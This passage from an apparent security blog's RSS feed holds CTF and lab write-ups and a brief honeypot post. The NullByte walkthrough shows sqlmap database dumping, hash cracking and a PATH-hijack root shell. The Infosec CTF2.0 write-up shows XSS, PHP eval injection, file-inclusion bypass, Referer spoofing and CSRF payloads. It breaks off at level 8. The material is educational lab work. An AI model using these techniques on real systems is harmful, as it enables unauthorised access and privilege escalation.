&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;

&amp;lt;snip&amp;gt;

&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt; injectable 
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; automatically extending ranges &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;potential&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; technique found
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; ORDER BY technique seems to be usable. This should reduce the &lt;span style=&#34;color: #f8f8f2&#34;&gt;time &lt;/span&gt;needed to find the right number of query columns. Automatically extending the range &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; current UNION query injection technique &lt;span style=&#34;color: #f8f8f2&#34;&gt;test&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; target URL appears to have &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt; columns in query
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt; injectable
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;

&lt;p&gt;(output shortened for clarity)
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --current-db
back-end DBMS: MySQL 5.0.12
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:44&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching current database
current database:    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;

root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --tables -D seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:55&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching tables &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; database: &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;
Database: seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; table&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+-------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; users &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+-------+


root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --dump -D seth -T users
Database: seth
Table: users
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt; entries&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; id &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; pass                                        &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; user   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; position   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ramses &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; --not allowed--                             &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; isis   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; employee   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;An MD5 hashed password? I best put that through &lt;a href=&#34;http://md5decoder.org/&#34;&gt;md5decoder&lt;/a&gt; to
be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-4:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;stage 4&lt;/h1&gt;

&lt;p&gt;Turns out that this is ramses&amp;rsquo;s password on the ssh service that&amp;rsquo;s running on
port 777 on the VM. So I&amp;rsquo;ll connect to that and have a look at what&amp;rsquo;s going on there.&lt;/p&gt;

&lt;p&gt;Not much in his home directory, so I&amp;rsquo;ll checkout what he&amp;rsquo;s been up to&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:~&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;cat .bash_history 
sudo -s
su eric
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
ls
clear
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /var/www
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;backup/
ls
./procwatch 
clear
sudo -s
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
ls
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Interesting, ramses has something in &lt;code&gt;/var/www&lt;/code&gt;. Seems like a setuid root
binary called &lt;code&gt;procwatch&lt;/code&gt;. After running it I would assume that it&amp;rsquo;s just running &lt;code&gt;ps&lt;/code&gt;
to return a list of processes. If I run &lt;code&gt;ps&lt;/code&gt; on its own, I get the same output (minus
procwatch of course)&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s see if it calls &lt;code&gt;ps&lt;/code&gt; with an absolute path, or not. As a quick test I&amp;rsquo;ll create
a symlink to &lt;code&gt;ls&lt;/code&gt; in the current directory and name it &lt;code&gt;ps&lt;/code&gt;. Then I set the &lt;code&gt;PATH&lt;/code&gt; environment variable
with the current dir at the front.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -s /bin/ls ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;pwd&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;:&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
ls  procwatch  ps  readme.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Excellent, it just calls &lt;code&gt;ps&lt;/code&gt; without a path. A classic issue you can often
find in programs that call other programs.&lt;/p&gt;

&lt;p&gt;So let me leverage this to get myself a root shell and ultimately the flag&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
&lt;span style=&#34;color: #75715e&#34;&gt;# whoami &lt;/span&gt;
root
&lt;span style=&#34;color: #75715e&#34;&gt;# cat /root/proof.txt&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;OUTPUT CUT&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Honeypotting with Dionaea and Raspi</title>
      <link>https://svenito.github.io/nowhere/2015/07/16/honeypotting-with-dionaea-and-raspi/</link>
      <pubDate>Thu, 16 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/07/16/honeypotting-with-dionaea-and-raspi/</guid>
      <description>&lt;p&gt;I recently setup a &lt;a href=&#34;http://dionaea.carnivore.it/&#34;&gt;dionaea&lt;/a&gt; honeypot on my Raspberry Pi
and after tweaking and configuring it for a few days have now got a working setup.
It&amp;rsquo;s a low interaction honeypot aimed to capture malware rather than ssh bruteforce
attacks.&lt;/p&gt;

&lt;p&gt;I plan to leave it online for a week or a month, and the analyse the stats and see
what it managed to collect. So far it&amp;rsquo;s mostly conficker variants, but there&amp;rsquo;s a
suprising (to me) large number of infected machines out there. In one 8 hour period
during testing, it managed to collect 8 unique samples from 154 connections.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s the stats from that period:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/j828Fpw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It should be fairly interesting to see if anything else comes along during its
uptime.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Infosec Institute CTF2.0</title>
      <link>https://svenito.github.io/nowhere/2015/06/25/infosec-institute-ctf2-dot-0/</link>
      <pubDate>Thu, 25 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/06/25/infosec-institute-ctf2-dot-0/</guid>
      <description>

&lt;p&gt;The folks over at the &lt;a href=&#34;https://infosecinstitute.com&#34;&gt;Infosec Institue&lt;/a&gt; have released
their &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/&#34;&gt;second CTF&lt;/a&gt;. Here&amp;rsquo;s how I got on&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;level-01:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 01&lt;/h1&gt;

&lt;p&gt;In &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php&#34;&gt;level 01&lt;/a&gt; I am supposed
to use the provided form to perform a cross site scripting exploit. Here&amp;rsquo;s what the form
looks like:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CJTNyK4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I might as well test how the form works. Entering something like &lt;code&gt;test&lt;/code&gt; and
&lt;code&gt;www.test.com&lt;/code&gt; in the fields simply adds the supplied information to the column on the left.
So I try the usual XSS payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Ex1&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt; in the &lt;code&gt;Site Name&lt;/code&gt; field.&lt;/p&gt;

&lt;p&gt;A popup tells me that I need to &lt;em&gt;match the requested format&lt;/em&gt;. Probably some client side
checks, so I inspect the field with Firebug and notice this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f5KzFDx.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The field has a regular expression premitting only upper or lowercase characters. I can either
delete this or just change it to &lt;code&gt;.+&lt;/code&gt; so it matches any character.&lt;/p&gt;

&lt;p&gt;Now resubmitting the XSS payload works and the string is reflected on the page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yvSc4To.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, there&amp;rsquo;s no pop up. So there must be something else validating input. Heading back to the
source I find some javscript in &lt;code&gt;ex1.js&lt;/code&gt; which contains the following code:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/VVe74tW.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VVe74tW.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;siteName&lt;/code&gt; variable has all &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters replaced with their equivalent html codes.
By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
my data. The Firebug debugger breaks on the line and I step over it. Sure enough &lt;code&gt;siteName&lt;/code&gt; is not
what I want it to be. Double clicking on the value in the right hand window allows me to edit it, and
revert it back to what I want it to be. Then clicking continue I am rewarded with:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VEFDpio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-02:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 02&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php&#34;&gt;Level 02&lt;/a&gt; is a simple web calculator:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/asgTWCw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I&amp;rsquo;m supposed to use the form to print &lt;code&gt;phpinfo&lt;/code&gt; or other data to the page. This is a PHP
script evaluating a simple expression. I am guessing that it&amp;rsquo;s going to be calling &lt;code&gt;eval&lt;/code&gt;, as
that&amp;rsquo;s a fairly common vulnerability, and fits to how the page works. After entering some numbers
and other characters into the two fields I quickly learn that the input for those fields is checked.
That means I can&amp;rsquo;t enter anything but numbers into those fields. That leaves the operator as the only
other thing under our control.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m going to guess that code looks somewhat like this:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;eval (&amp;quot;print $num1 $op $num2;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I need to change the operand to something that prints &lt;code&gt;phpinfo&lt;/code&gt; but leaves the rest of the statement
valid. With Firebug I can edit the value of the operand to the following:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8xnqMxv.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hit submit and&amp;hellip;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/rUgaixe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-03:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 03&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php&#34;&gt;Level 03&lt;/a&gt; provides me with a registration
form and a login form. The instructions indicate that the data is stored in a delimited file and I need
to sign up as a new user with admin rights.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f0g5TmV.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;First things first, let&amp;rsquo;s see if we can figure out the delimiter&amp;hellip; Signing up and logging in
shows us our name and current role: &lt;code&gt;role:normal&lt;/code&gt;. This already tells me that the delimiter is not
&lt;code&gt;:&lt;/code&gt;. After fuzzing the input it turns out most characters are ok to use. So what&amp;rsquo;s the delimeter?
I check the hints and it tells me that it&amp;rsquo;s the newline character. Interesting, in my fuzzing I tried that,
but had no luck. Unless..&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s not use &lt;code&gt;\n&lt;/code&gt; but a real new line. I can achieve this by editing the source with Firebug
once again, changing the &lt;code&gt;lastname&lt;/code&gt; field to a &lt;code&gt;textarea&lt;/code&gt; type:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QBVptMv.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QBVptMv.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now I can have multiple lines and enter a real carriage return into the field. My last
name will be&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;alpha7
role:admin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And after a login with the new creds:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Akj9NL8.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-04:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 04&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php&#34;&gt;Level 04&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/nmRe8U2.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nmRe8U2.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we need to load a php file instead of the text files that load when you click
on the &lt;em&gt;Bio&lt;/em&gt;, &lt;em&gt;Clients&lt;/em&gt;, or &lt;em&gt;About&lt;/em&gt; buttons. The instructions are very clear,
but it sounds like we need to load a phop file from the root of the domain. Let&amp;rsquo;s
see what restrictions are in place.&lt;/p&gt;

&lt;p&gt;Fuzzing the file parameter I notice that it seems to test for &lt;code&gt;fileNiXtxt&lt;/code&gt; where &lt;em&gt;N&lt;/em&gt; is
any number and &lt;code&gt;X&lt;/code&gt; is any other character. Anything other than that pattern will print &lt;code&gt;Invalid file selected.&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entering &lt;code&gt;index.php;file1.txt&lt;/code&gt; for example gives a different error: &lt;code&gt;There is something else that you must do.&lt;/code&gt;.
Interesting. So I guess it just needs to be somewhere in that argument for the filter to accept it. But
how can we accomplish this with a valid payload?&lt;/p&gt;

&lt;p&gt;One thing I tried was &lt;code&gt;/file1/txt/../../file.php&lt;/code&gt; which wasn&amp;rsquo;t right either. Here we make use
of relative paths where when PHP opens the file, it will ignore the fact that the path
&lt;code&gt;/file1/txt&lt;/code&gt; doesn&amp;rsquo;t exist and treat this as if &lt;code&gt;file.php&lt;/code&gt; as at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;UPDATE: Solved&lt;/p&gt;

&lt;p&gt;So the key bit I was missing was that it wanted a remote, even if that remote is the
same domain as the current page. So I added &lt;code&gt;http://infosecinstitute.com/file3.php&lt;/code&gt; as
the argument to get a new error: &lt;em&gt;You are trying to add a remote URL.&lt;/em&gt; Ok, now we are getting somewhere.
As one of the hints is that the regex might be case sensitive, let&amp;rsquo;s capitalise the &lt;code&gt;h&lt;/code&gt; in &lt;code&gt;http&lt;/code&gt;.
This time we get an &lt;em&gt;invalid file&lt;/em&gt; message, so that bypass worked. Now we need to satisfy the
&lt;code&gt;file3.txt&lt;/code&gt; requirement and using &lt;code&gt;Http://infosecinstitute.com/file3.txt.php&lt;/code&gt; I get the flag&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/WTFYtJi.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WTFYtJi.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-05:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 05&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php&#34;&gt;Level 05&lt;/a&gt; starts by telling
me that I am not logged in.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/BOBdkHX.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, I don&amp;rsquo;t remember logging in, so that&amp;rsquo;s not unusual. What is unusual is
that the &lt;code&gt;login&lt;/code&gt; button doesn&amp;rsquo;t work. I&amp;rsquo;ll quickly check the source code and notice
that it&amp;rsquo;s disabled, but also that it points to &lt;code&gt;login.html&lt;/code&gt;. Enabling and clicking it
takes me to a 404, so no go. The vulnerability here is &lt;em&gt;Missing Function Level Access Control&lt;/em&gt;
so perhaps this page assumes we&amp;rsquo;re logged in if we are coming from the login page. Let&amp;rsquo;s
assume that if the user is successful on &lt;code&gt;login.html&lt;/code&gt;, that page will redirect here, and then
this page will just assume that the user is allowed to be here.&lt;/p&gt;

&lt;p&gt;Using an intercepting proxy I&amp;rsquo;ll edit the &lt;code&gt;Referer&lt;/code&gt; field in the original request, so that
it appears to be coming from the login page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EK9u7Ir.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Forward the request and&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QCisDvN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-06:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 06&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex6.php&#34;&gt;Level 06&lt;/a&gt; shows a nice
big text area with allowable HTML tags.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Waq1AVN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time I need to perform a cross site request forgery. This can be accomlished by an &lt;code&gt;href&lt;/code&gt;
tag, but trying this tells me that they are expecting something that will perform the request
without the need for user interaction. Ok, fine, let&amp;rsquo;s revisit the allowed tags. &lt;code&gt;img&lt;/code&gt; looks useful, right?&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s try the following&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qCd5NUP.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yep, that&amp;rsquo;s what we needed.&lt;/p&gt;

&lt;h1 id=&#34;level-07:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 07&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php&#34;&gt;Level 07&lt;/a&gt; is a login form on which
we need to perform another XSS attack.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WO8dRpe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
the one you see there. Some investigation shows that the value of the hidden field comes from
a php_self value. That is it uses whatever the URL part is to populate the field, so that form
is submitted back to itself.&lt;/p&gt;

&lt;p&gt;Using this we can inject something into the field to hopefully reflect our data on the page.
By employing the &lt;code&gt;arg&lt;/code&gt; paramater we can close the &lt;code&gt;input&lt;/code&gt; tag, and the inject our &lt;code&gt;h1&lt;/code&gt; tags:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg=&amp;#39;&amp;gt;&amp;lt;h1&amp;gt;username&amp;lt;/h1&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Submitting that puts &lt;code&gt;username&lt;/code&gt; on the page surrounded by &lt;code&gt;h1&lt;/code&gt; tags and nabs the flag&lt;/p&gt;

&lt;h1 id=&#34;level-08:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 08&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php&#34;&gt;Level 08&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/610ZNNq.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we need to upload an image that will produce a javscript alert. First things first with these
things I upload an image to see how it behaves. Once uploaded I click on the example links and notice that
images are fetched via an id. The URL is&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So let me see if I can access an image via another ID, for example &lt;code&gt;id=4&lt;/code&gt;.
I get the message:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;This attachment is currently under review by our editors. 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So no. Checking out the image URL for one of the chess images shows me that the images
are stored at &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess1.png&lt;/code&gt; for example.&lt;/p&gt;

